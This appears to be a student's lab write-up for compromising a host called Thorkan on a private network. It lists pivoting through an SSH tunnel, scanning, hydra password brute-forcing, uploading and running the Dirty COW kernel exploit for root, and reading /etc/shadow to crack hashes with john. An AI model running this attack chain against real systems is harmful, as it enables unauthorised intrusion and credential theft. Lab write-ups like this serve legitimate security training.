# Thorkan 192.168.10.4
## Andrea Zonnekus 18758119

ip a

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.001.png)

su firefart

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.002.png)

nmap -F 192.168.10.10/24 –open

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.003.png)

192.168.10.4

192.168.10.30



nmap -Pn -sV -p- 192.168.10.4

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.004.png)

https://sushant747.gitbooks.io/total-oscp-guide/content/port\_forwarding\_and\_tunneling.html

ssh -D 9050 aetian@192.168.2.150 -o HostKeyAlgorithms=+ssh-dss

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.005.png)

proxychains nmap -sV -sC -p 21,22,80,111,2049,5801,5901,54176,54364,60849 -Pn --open 192.168.10.4 -oN host

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.006.png)

proxychains [ftp 192.168.10.4]()

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.007.png)



proxychains dirb <http://192.168.10.4>

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.008.png)

proxychains firefox <http://192.168.10.4/index.html>

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.009.png)

proxychains nikto -host <http://192.168.10.4>

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.010.png)

proxychains4 vncviewer 192.168.10.4:5901

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.011.png)

proxychains hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.4 -m ssh -e nsr

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.012.png)

(checked the tutorial and rockyou would never have found this one)

(wanted to have some fun with hashcat anyways so made password.txt which has ‘password’

hashcat --force password.txt -r /usr/share/hashcat/rules/best64.rule --stdout >> passwords.txt

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.013.png)

proxychains hydra -L users.txt -P passwords.txt ssh://192.168.10.4 -m ssh -e nsr

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.014.png)

proxychains ftp <vinicius@192.168.10.4>

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.015.png)



proxychains ssh vinicius@192.168.10.4 -o HostKeyAlgorithms=+ssh-dss

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.016.png)

uname -a

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.017.png)

put test.txt

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.018.png)

binary

put les.sh

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.019.png)

https://www.exploit-db.com/raw/40839

put 40839.c

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.020.png)

gcc 40839.c -pthread -o cow -lcrypt

./cow

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.021.png)



su firefart

whoami

id

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.022.png)

cat /etc/passwd

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.023.png)

cat /etc/shadow

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.024.png)

john passwd shadow

![](thorkan_steps/Aspose.Words.3262bff9-abbb-477a-94ec-767f23ff51f9.025.png)
